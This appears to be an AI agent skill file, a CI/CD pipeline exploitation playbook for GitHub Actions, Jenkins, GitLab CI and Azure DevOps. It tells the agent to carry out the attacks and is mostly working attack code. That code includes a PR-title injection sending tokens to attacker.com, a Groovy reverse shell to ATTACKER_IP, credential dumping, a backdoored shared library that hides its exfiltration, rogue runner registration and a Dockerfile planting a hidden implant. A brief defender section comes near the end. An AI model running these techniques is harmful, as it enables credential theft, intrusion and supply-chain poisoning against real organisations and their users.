---
name: offensive-cicd-pipeline
description: "Comprehensive CI/CD pipeline exploitation methodology covering GitHub Actions injection vectors (expression injection via PR titles and issue bodies, workflow_run event abuse, GITHUB_TOKEN over-scoping, composite action supply chain compromise), Jenkins attack paths (Groovy sandbox escapes, script console remote code execution, Java remoting deserialization, credential store dumping, shared library injection), GitLab CI exploitation (YAML anchor injection, runner registration token abuse, CI variable extraction, protected branch bypass via merge request pipelines), and Azure DevOps pipeline agent compromise with service connection theft. Includes artifact poisoning techniques across all platforms, tooling guidance for gato and jenkins-attack-framework, and maps to MITRE ATT&CK T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). Covers enumeration of pipeline configurations, privilege escalation from contributor to code execution, lateral movement through pipeline trust boundaries, and persistence via modified workflow definitions. Each technique section provides working exploitation code, detection indicators, and defensive countermeasures."
---

# Offensive CI/CD Pipeline Exploitation

CI/CD pipelines represent one of the highest-value targets in modern infrastructure. A compromised
pipeline grants code execution in trusted contexts, access to deployment credentials, and the ability
to inject malicious code into production artifacts. You exploit the implicit trust that organizations
place in their build systems -- pipelines run code with elevated privileges, hold secrets for
deployment, and operate with minimal monitoring compared to production systems.

This skill covers exploitation across the four dominant CI/CD platforms. You enumerate pipeline
configurations, identify injection points, escalate from contributor-level access to arbitrary code
execution, and leverage pipeline trust to move laterally through environments.

MITRE ATT&CK: T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain)

## Quick Workflow

1. Enumerate accessible repositories and their pipeline configurations (.github/workflows/, Jenkinsfile, .gitlab-ci.yml, azure-pipelines.yml).
2. Identify the trigger model -- which events execute pipelines, and which contexts carry attacker-controlled input.
3. Map token scopes and available secrets for each pipeline context.
4. Select the injection vector matching your access level (contributor, external PR, authenticated user).
5. Craft the payload for the target platform's expression language or script engine.
6. Execute and capture output -- secrets, tokens, or artifact modification.
7. Pivot using captured credentials to expand access to other pipelines, registries, or infrastructure.

---

## GitHub Actions Expression Injection

GitHub Actions evaluates expressions in `${{ }}` contexts. When attacker-controlled data flows into
these expressions without sanitization, you achieve arbitrary command injection in the runner context.

The most common injection surfaces are PR titles, issue bodies, branch names, and commit messages
that flow into `run:` steps or action inputs.

Identify vulnerable workflows by searching for direct interpolation of event data:

```bash
# Search for expression injection sinks in workflow files
grep -rn '\${{.*github\.event\.' .github/workflows/
grep -rn '\${{.*github\.head_ref' .github/workflows/
grep -rn '\${{.*github\.event\.pull_request\.title' .github/workflows/
grep -rn '\${{.*github\.event\.issue\.body' .github/workflows/
grep -rn '\${{.*github\.event\.comment\.body' .github/workflows/
grep -rn '\${{.*github\.event\.discussion\.body' .github/workflows/
```

A vulnerable workflow looks like this:

```yaml
# Vulnerable: PR title flows directly into shell execution
name: PR Greeting
on: pull_request_target
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Thanks for PR: ${{ github.event.pull_request.title }}"
```

You inject through the PR title:

```text
"; curl -s https://attacker.com/exfil?token=$(cat $GITHUB_TOKEN) #
```

For `workflow_run` abuse, a workflow triggered by `workflow_run` runs in the context of the default
branch but can access artifacts from the triggering workflow. You upload a poisoned artifact from a
PR workflow, then the `workflow_run` workflow processes it with elevated privileges:

```yaml
# Attacker's PR modifies the artifact upload step
- uses: actions/upload-artifact@v4
  with:
    name: pr-data
    path: payload.sh

# The workflow_run handler in the default branch processes artifacts unsafely
on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
      - run: bash pr-data/payload.sh  # Executes attacker's code with write access
```

Enumerate GITHUB_TOKEN permissions to understand your execution scope:

```bash
# Inside a compromised workflow step, dump token permissions
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/$GITHUB_REPOSITORY | jq '.permissions'

# Check if the token can push to the repository
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs/heads/main
```

Composite action supply chain attacks target reusable actions referenced without SHA pinning:

```yaml
# Vulnerable: references a tag that can be force-pushed
- uses: org/custom-action@v1

# Secure: references an immutable commit SHA
- uses: org/custom-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
```

Use gato to enumerate and exploit GitHub Actions misconfigurations:

```bash
# Enumerate self-hosted runners and vulnerable workflows
gato enumerate -t ghp_TOKENHERE -r org/repo
gato enumerate -t ghp_TOKENHERE -o target-org

# Search for expression injection across an organization
gato search -t ghp_TOKENHERE -o target-org -sg
```

---

## Jenkins Exploitation

Jenkins presents a broad attack surface through its script console, build configurations, shared
libraries, and the Java remoting protocol. You target Jenkins when you discover it exposed on the
network or when you obtain any level of authenticated access.

### Groovy Script Console RCE

If you have access to the script console (requires Overall/RunScripts permission), you have
unrestricted code execution on the Jenkins controller:

```groovy
// Direct command execution via script console
def cmd = "id && cat /etc/passwd".execute()
println cmd.text

// Reverse shell from Jenkins controller
def proc = ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()

// Read Jenkins secrets directly
import hudson.util.Secret
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials

def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class,
    Jenkins.instance, null, null
)
creds.each { c ->
    println("ID: ${c.id}")
    println("Username: ${c.username}")
    println("Password: ${c.password.plainText}")
    println("---")
}
```

### Groovy Sandbox Escape

Pipeline scripts run in a Groovy sandbox, but you bypass it through meta-programming and reflection:

```groovy
// Sandbox escape via meta-class manipulation
@Grab('commons-io:commons-io:2.11.0')
import org.apache.commons.io.IOUtils

// Bypass via method pointer and reflection
def bypass = evaluate('''
class Evil {
    static void main(String[] args) {}
    static Object run() {
        def proc = "id".execute()
        return proc.text
    }
}
Evil.run()
''')
println bypass
```

### Jenkins Remoting Deserialization

When the Jenkins remoting port (typically 50000) is exposed, you exploit Java deserialization
vulnerabilities:

```bash
# Identify Jenkins remoting port
nmap -sV -p 50000 TARGET_IP

# Use ysoserial to generate deserialization payloads
java -jar ysoserial.jar CommonsCollections1 'curl http://ATTACKER_IP/pwned' > payload.bin

# Deliver via the JNLP protocol
python3 jenkins_exploit.py --target TARGET_IP:50000 --payload payload.bin
```

### Shared Library Injection

Jenkins shared libraries loaded via `@Library` are a supply chain vector. If you compromise the
library repository, every pipeline using it executes your code:

```groovy
// Malicious shared library vars/deploy.groovy
def call(Map config) {
    // Original functionality preserved to avoid detection
    sh "kubectl apply -f ${config.manifest}"

    // Injected exfiltration
    sh '''
        env | base64 | curl -X POST -d @- https://attacker.com/collect
    '''
}
```

Use jenkins-attack-framework for systematic exploitation:

```bash
# Enumerate Jenkins instance
python3 jaf.py --url https://jenkins.target.com --enumerate

# Dump all credentials with valid session
python3 jaf.py --url https://jenkins.target.com --cookie "JSESSIONID=abc123" --dump-creds

# Execute command via available build nodes
python3 jaf.py --url https://jenkins.target.com --cookie "JSESSIONID=abc123" \
  --exec "whoami" --node "linux-build-01"
```

---

## GitLab CI Exploitation

GitLab CI pipelines execute based on `.gitlab-ci.yml` and support powerful features that create
exploitation opportunities. You target variable injection, runner abuse, and trust boundary
violations between merge requests and protected branches.

### YAML Injection via Merge Requests

When a project allows merge request pipelines from forks, the attacker's `.gitlab-ci.yml`
executes on the target's runners:

```yaml
# Attacker's .gitlab-ci.yml in a fork
stages:
  - exploit

dump_secrets:
  stage: exploit
  script:
    - env | sort
    - cat /etc/hosts
    - curl -sS --header "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
        "https://gitlab.target.com/api/v4/projects/$CI_PROJECT_ID/variables" | python3 -m json.tool
    - |
      # Attempt to read secrets from runner filesystem
      find / -name "*.env" -o -name "credentials" -o -name "*.key" 2>/dev/null | head -20
      cat ~/.docker/config.json 2>/dev/null || true
```

### Runner Registration Token Abuse

If you obtain a runner registration token, you register a rogue runner that intercepts jobs:

```bash
# Register a malicious runner with broad tag matching
gitlab-runner register \
  --non-interactive \
  --url "https://gitlab.target.com/" \
  --registration-token "GR1348941_STOLEN_TOKEN" \
  --executor "shell" \
  --description "build-node-07" \
  --tag-list "docker,linux,build,deploy" \
  --run-untagged="true"

# The rogue runner now receives jobs and can:
# 1. Capture all environment variables including secrets
# 2. Modify build artifacts before they are published
# 3. Inject code into deployment payloads
```

### CI Variable Extraction

Enumerate and extract CI/CD variables using the API with a compromised token:

```bash
# List project-level variables
curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.target.com/api/v4/projects/PROJECT_ID/variables" | jq '.[] | {key, value, protected, masked}'

# List group-level variables (inherited by all projects)
curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.target.com/api/v4/groups/GROUP_ID/variables" | jq '.[] | {key, value}'

# Instance-level variables (requires admin)
curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.target.com/api/v4/admin/ci/variables" | jq '.'
```

### Protected Branch Bypass

Exploit the gap between merge request pipelines and branch pipelines to run code in protected
contexts:

```bash
# Create a merge request that modifies .gitlab-ci.yml
# The MR pipeline runs with the source branch's CI config
# but in the context of the target project's runners and variables

# If the project has "Run pipelines for merge requests from forked projects" enabled,
# your fork's .gitlab-ci.yml executes on their infrastructure
git checkout -b exploit-branch
cat > .gitlab-ci.yml << 'EOF'
protected_job:
  script:
    - echo "$DEPLOY_KEY" | base64
    - echo "$AWS_SECRET_ACCESS_KEY" | base64
  only:
    - merge_requests
EOF
git add .gitlab-ci.yml && git commit -m "Update CI config" && git push origin exploit-branch
```

---

## Azure DevOps Pipeline Exploitation

Azure DevOps pipelines use YAML or classic editor definitions. You target pipeline agent compromise,
service connection abuse, and variable group extraction.

### Pipeline Agent Abuse

Self-hosted agents retain state between builds. You exploit this persistence:

```yaml
# azure-pipelines.yml payload targeting self-hosted agent
trigger: none
pr: none

pool:
  name: 'Self-Hosted-Pool'

steps:
- script: |
    # Enumerate the agent environment
    whoami
    hostname
    env | sort

    # Search for cached credentials on the agent
    find /home/ -name ".kube" -o -name ".aws" -o -name ".azure" 2>/dev/null
    cat /home/*/.kube/config 2>/dev/null
    cat /home/*/.aws/credentials 2>/dev/null

    # Check for Docker credentials
    cat /home/*/.docker/config.json 2>/dev/null

    # Look for other pipeline artifacts left behind
    ls -la /agent/_work/
    find /agent/_work/ -name "*.env" -o -name "*.key" -o -name "*.pem" 2>/dev/null
  displayName: 'Agent Recon'
```

### Service Connection Theft

Service connections in Azure DevOps store credentials for external systems. You extract them
through pipeline execution:

```yaml
steps:
- task: AzureCLI@2
  inputs:
    azureSubscription: 'Production-Azure-Connection'
    scriptType: 'bash'
    scriptLocation: 'inlineScript'
    inlineScript: |
      # The task injects credentials as environment variables
      echo "Tenant: $tenantId"
      echo "Client: $servicePrincipalId"

      # Extract the service principal token
      az account get-access-token --output json

      # Use the managed identity to enumerate Azure resources
      az resource list --output table
      az keyvault list --output table
      az keyvault secret list --vault-name TARGET_VAULT --output table
```

### Variable Group Extraction

```bash
# Use the Azure DevOps REST API with a compromised PAT
PAT="STOLEN_PAT_HERE"
ORG="target-org"
PROJECT="target-project"

# List variable groups
curl -sS -u ":$PAT" \
  "https://dev.azure.com/$ORG/$PROJECT/_apis/distributedtask/variablegroups?api-version=7.0" \
  | jq '.value[] | {name, variables}'

# List service connections
curl -sS -u ":$PAT" \
  "https://dev.azure.com/$ORG/$PROJECT/_apis/serviceendpoint/endpoints?api-version=7.0" \
  | jq '.value[] | {name, type, authorization}'
```

---

## Artifact Poisoning

Artifact poisoning targets the handoff between build and deploy stages. You modify build outputs
to inject malicious code into deployment packages.

```bash
# GitHub Actions: Intercept artifact upload
# In a compromised build step, modify artifacts before upload
echo 'curl https://attacker.com/beacon' >> dist/entrypoint.sh

# GitLab CI: Poison the artifact cache
# Shared caches between pipelines allow cross-job poisoning
cat > .gitlab-ci.yml << 'EOF'
poison_cache:
  script:
    - echo 'malicious_payload()' >> node_modules/.cache/babel-loader/payload.js
  cache:
    key: shared-build-cache
    paths:
      - node_modules/
    policy: push
EOF

# Jenkins: Modify stashed files between stages
# If you control a build node, modify files after stash
# The unstash on a different node receives your modified files
```

Container image poisoning in registry pipelines:

```dockerfile
# Inject a backdoor layer into a build pipeline's Dockerfile
FROM base-image:latest
# Legitimate build steps
COPY . /app
RUN npm install && npm run build
# Injected persistence
RUN curl -sS https://attacker.com/implant -o /usr/local/bin/.svc && chmod +x /usr/local/bin/.svc
ENTRYPOINT ["/usr/local/bin/.svc", "--", "/app/entrypoint.sh"]
```

---

## Detection / Defender View

Defenders should monitor for these indicators across their CI/CD platforms:

- **Workflow modifications**: Alert on changes to `.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`, or `azure-pipelines.yml` in pull requests from external contributors or forks.
- **Unusual runner registration**: New runner registrations, especially with broad tag matching or from unexpected IP ranges.
- **Secret access patterns**: CI jobs accessing secrets they have not historically used, or secrets being accessed in PR-triggered pipelines.
- **Expression injection signatures**: PR titles or issue bodies containing shell metacharacters (`$()`, backticks, semicolons, pipe operators) adjacent to workflow trigger events.
- **Artifact integrity**: Hash verification of build artifacts between pipeline stages; unexpected changes indicate poisoning.
- **Token scope anomalies**: GITHUB_TOKEN or CI_JOB_TOKEN making API calls outside the expected scope of the pipeline (e.g., accessing other repositories, modifying branch protections).
- **Jenkins audit log**: Script console access, credential enumeration via the API, and new node registrations from unauthorized sources.
- **Build duration anomalies**: Compromised builds often take longer due to exfiltration steps or additional network calls.
- **Outbound network from runners**: Build agents making connections to unexpected external hosts, especially data exfiltration over DNS or HTTPS to non-registry domains.

Key defensive controls:

- Pin all GitHub Actions to full commit SHAs, not tags.
- Restrict `pull_request_target` usage and never check out PR code in that context.
- Use ephemeral runners that are destroyed after each job.
- Implement OIDC for cloud authentication instead of storing long-lived credentials.
- Enable branch protection rules requiring review for workflow file changes.
- Segment runner pools by trust level -- never share runners between public and private repositories.

---

## Engagement Cheatsheet

| Platform        | Vector                       | Access Required         | Impact          |
|-----------------|------------------------------|-------------------------|-----------------|
| GitHub Actions  | Expression injection         | Fork/PR (none)          | Runner RCE      |
| GitHub Actions  | workflow_run artifact poison | Fork/PR (none)          | Default branch RCE |
| GitHub Actions  | Composite action supply chain| Action repo write       | All consumers RCE |
| Jenkins         | Script console               | RunScripts permission   | Controller RCE  |
| Jenkins         | Groovy sandbox escape        | Build configure         | Controller RCE  |
| Jenkins         | Remoting deserialization     | Network access (50000)  | Controller RCE  |
| Jenkins         | Shared library injection     | Library repo write      | All consumers RCE |
| GitLab CI       | MR pipeline YAML injection   | Fork (none)             | Runner RCE      |
| GitLab CI       | Runner token registration    | Token leak              | Job interception |
| GitLab CI       | Variable extraction          | API token               | Secret theft    |
| Azure DevOps    | Agent persistence            | Pipeline edit           | Agent RCE       |
| Azure DevOps    | Service connection theft     | Pipeline edit           | Cloud access    |
| All Platforms   | Artifact poisoning           | Build step compromise   | Supply chain    |

---

## Key References

- OWASP Top 10 CI/CD Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- Cider Security (now Palo Alto) CI/CD Goat: https://github.com/cider-security-research/cicd-goat
- gato - GitHub Actions enumeration and attack tool: https://github.com/praetorian-inc/gato
- jenkins-attack-framework: https://github.com/Accenture/jenkins-attack-framework
- Abusing GitHub Actions (Synacktiv): https://www.synacktiv.com/en/publications
- MITRE ATT&CK T1195.002: https://attack.mitre.org/techniques/T1195/002/
- GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- Attacking and Defending CI/CD Pipelines (NCC Group): https://research.nccgroup.com
- GitLab CI/CD Security: https://docs.gitlab.com/ee/ci/security/
- Azure DevOps Pipeline Security: https://learn.microsoft.com/en-us/azure/devops/pipelines/security/
